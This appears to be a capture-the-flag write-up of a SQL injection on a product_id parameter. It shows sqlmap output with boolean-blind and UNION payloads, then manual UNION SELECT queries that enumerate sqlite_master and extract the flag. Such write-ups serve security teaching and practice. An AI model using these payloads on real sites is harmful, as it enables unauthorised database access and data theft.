- Played with the `product_id` field and noticed an injection endpoint
- Ran through sqlmap
```sh
sqlmap -r req.txt
sqlmap identified the following injection point(s) with a total of 26 HTTP(s) requests:
---
Parameter: product_id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: product_id=1 AND 6591=6591

    Type: UNION query
    Title: Generic UNION query (NULL) - 4 columns
    Payload: product_id=-9772 UNION ALL SELECT NULL,NULL,CHAR(113,106,122,122,113)||CHAR(76,110,67,116,86,77,89,107,66,85)||CHAR(113,107,106,122,113),NULL-- BHdw
---
[15:49:11] [INFO] testing SQLite
[15:49:11] [WARNING] the back-end DBMS is not SQLite
[15:49:11] [CRITICAL] sqlmap was not able to fingerprint the back-end database management system
```

- sqlmap shit the bed and we couldn't get it working so we took its output and ran manually:
`?product_id=-1 UNION SELECT name,NULL,NULL,NULL FROM sqlite_master WHERE type='table'--`
```
# Available Space Products 🚀

|ID|Name|Description|Price|
|---|---|---|---|
|flag|None|None|None|
```

`?product_id=-1 UNION SELECT sql,NULL,NULL,NULL FROM sqlite_master WHERE name='flag'--`,
```
# Available Space Products 🚀

|ID|Name|Description|Price|
|---|---|---|---|
|CREATE TABLE flag ( id INTEGER PRIMARY KEY AUTOINCREMENT, flag TEXT NOT NULL UNIQUE )|None|None|None|
```

`?product_id=-1 UNION SELECT flag,NULL,NULL,NULL FROM flag--`
```
# Available Space Products 🚀

|ID|Name|Description|Price|
|---|---|---|---|
|sun{baby_SQL_injection_this_is_known_as_error_based_SQL_injection_8767289082762892}|None|None|None|
```

